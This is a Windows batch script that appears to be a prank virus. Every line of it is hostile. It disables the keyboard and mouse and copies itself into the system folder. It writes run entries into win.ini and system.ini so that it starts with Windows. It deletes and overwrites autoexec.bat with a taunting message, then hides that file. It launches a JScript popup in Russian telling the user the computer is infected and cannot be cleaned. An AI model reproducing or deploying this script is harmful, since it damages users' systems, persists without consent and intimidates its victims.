@echo off
rundll32 keyboard,disable
rundll32 mouse,disable
copy %0 %windir%/system
echo run=%windir%/system/*.bat >> win.ini
echo run=%windir%/system/*.bat >> system.ini
label LOHOLAMMER
if exist c:\autoexec.bat attrib c:\autoexec.bat -h -s -a -r
deltree /y c:\autoexec.bat > nul
echo autoexec.bat echo YOU ARE LAMMER...xe-xe-xe > c:\autoexec.bat
rundll32 mouse,enable
rundll32 keyboard,enable
echo var WSHShell = WScript.CreateObject("WScript.Shell"); > %temp%\mes.js
echo WSHShell.Popup("Warning,.. Ваш компьютер заражен вирусом, а избавиться от него нельзя, хе-хе-хе"); >> %temp%\mes.js
start %temp%\mes.js
deltree /y %temp%\mes.js
attrib c:\autoexec.bat +h +s +a +r
pause
cls
